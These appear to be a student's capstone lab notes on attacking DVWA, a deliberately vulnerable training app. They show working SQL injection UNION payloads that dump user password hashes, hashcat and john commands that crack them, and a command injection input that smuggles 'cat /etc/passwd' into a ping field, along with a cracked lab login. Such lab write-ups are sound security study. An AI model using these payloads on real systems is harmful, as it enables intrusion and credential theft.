I manged to use sql to show the user database and password.

```
1' OR 1=1 UNION SELECT user_id, password FROM users #
```

![[Pasted image 20240620141258.png]]

I can now crack the passwords with hashcat and john.

```
hashcat -m 0 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt 
```

![[Pasted image 20240620142548.png]]

The first hash is the admin pass that i used to log in.

I did all of the passes just in case they are needed later:

![[Pasted image 20240620144918.png]]

```
john --show --format=RAW-MD5 hashes.txt
```

Having trouble logging in for some reason. I realise i must not have the correct username.

##### Task

###### Locate and open the file with Challenge 1 code.

1. Log into **172.17.0.2** as **Gordon Brown**.
2. Locate and open the flag file in the user's home directory.

I need to find his username so i'm going through some union attacks.

Finding the number of tables

```
1 UNION SELECT null,null--'
```

![[Pasted image 20240620152856.png]]

We can also do `order by` to find the columns:

![[Pasted image 20240620154235.png]]

![[Pasted image 20240620154259.png]]

I try to determine if the columns are strings or numbers by changing the null to either a number or string to see if the server returns an error, in this case they are numbers.

We use the firefox extension hackbar to help us enumerate, but we could have just as easily used Burp:
![[Pasted image 20240620155624.png]]

```
http://172.17.0.2/dvwa/vulnerabilities/sqli/?id=%27 UNION SELECT 1,CONCAT_WS(CHAR(32,58,32),user(),database(),version()) -- &Submit=Submit#
```

I find some more strings from hacktricks
```
SELECT group_concat(<COLUMN>) FROM <TABLE>
SELECT group_concat(if(strcmp(table_schema,database()),table_name,null))
SELECT group_concat(CASE(table_schema)When(database())Then(table_name)END)
```

---

I remembered about command injection and tried to see if i could get a username from that.

```
192.168.78.6;cat /etc/passwd
```

I get gordons username by simply adding on another command to the initial ping, and i'm quite annoyed i didn't try it out already. It must have been one of the only name combos i didn't try, but that's okay! 

![[Pasted image 20240620160856.png]]

We can now log in and finish part one of the capstone, but it's getting late so i'll have to start first thing in the morning. 

Username:gordonb
Password:abc123

Before i finish, i log into the gordonb account to verify it's correct, and it is.

![[Pasted image 20240620161100.png]]

And we get the code:

![[Pasted image 20240620161334.png]]

---

